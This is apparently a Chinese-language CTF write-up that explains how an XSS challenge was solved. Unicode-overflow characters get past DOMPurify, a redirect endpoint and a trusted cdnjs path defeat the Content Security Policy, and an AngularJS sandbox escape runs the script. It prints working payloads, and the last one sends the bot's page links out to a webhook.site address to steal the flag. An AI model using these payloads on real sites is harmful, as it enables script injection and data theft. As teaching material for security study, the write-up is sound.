# 从一道XSS题学习CSP绕过

  
  
&lt;!--more--&gt;  
## 0x00 解题记录  
`/create`可以创建笔记存入到数据库，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png)
`/note`可以展示笔记  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png)
但在`/create`处存在`DOMPurify`来过滤`xss`，由于是最新版无法绕过，  
需要注意到在`/note`笔记展示的地方，是利用了`ascii`来处理了字符串，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png)
这里会涉及到一个`unicode`溢出的安全问题  
举一个🌰  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png)
利用这个原理，选两个`unicode`字符来逃逸`&lt;&gt;`  
`氼`、`夾`  
来试一下，正常的解析了`&lt;&gt;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png)
构造一个payload  
```javascript  
氼script src=&#34;https://www.example.com&#34;夾alert(1);//氼/script 夾  
```  
正常触发了CSP  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png)
现在就需要绕过CSP了，利用`/redirect`接口绕过CSP即可  
```javascript  
  res.setHeader(  
    &#34;Content-Security-Policy&#34;,  
    `script-src &#39;self&#39; &#39;nonce-${nonce}&#39; &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js; base-uri &#39;none&#39;; object-src &#39;none&#39;;`  
  );  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png)
还需要利用到`angular`组件，原因如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png)
在重定向只会忽略路径部分，而不会忽略URL，而CSP中又恰巧信任了`https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js`  

```javascript  
氼script src=&#34;http://localhost:3000/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&#34; 夾  //氼/script 夾  
&lt;div data-ng-app&gt; {{&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1} } };alert(1);//&#39;);}} &lt;/div&gt;  
```  

（这里在本地搭建了一个作为测试）  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png)
根据`bot.ts`来盗取`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png)
payload  

```javascript  
氼script src=&#34;http://localhost:3000/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&#34; 夾  //氼/script 夾  
&lt;div data-ng-app&gt;{{&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1} } };  
    fetch(`http://localhost:3000/`).then(res=&gt;res.text()).then(data=&gt;{ const parser = new DOMParser();  
    const doc = parser.parseFromString(data, &#34;text/html&#34;);  
    const links = Array.from(doc.querySelectorAll(&#34;a&#34;)).map(a =&gt; a.href);  
    const encodedLinks = btoa(unescape(encodeURIComponent(JSON.stringify(links))));  
    return fetch(&#34;https://webhook.site/5b154691-3fdb-46b8-980b-735e19b081f2?ans=&#34; &#43; encodedLinks, { method: &#34;GET&#34;, mode: &#34;no-cors&#34; })});//&#39;);}}&lt;/div&gt;  
```  

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png)
## Reference  
[https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows &#34;https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows&#34;)https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects  
https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques  
https://csp-evaluator.withgoogle.com/  
https://github.com/Mehdi0x90/Web_Hacking/blob/main/CSP%20Bypass.md  
  
## 0x00000  
弟弟新建了一个交流群，欢迎有兴趣的师傅一起来讨论有趣的Web题
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87/  

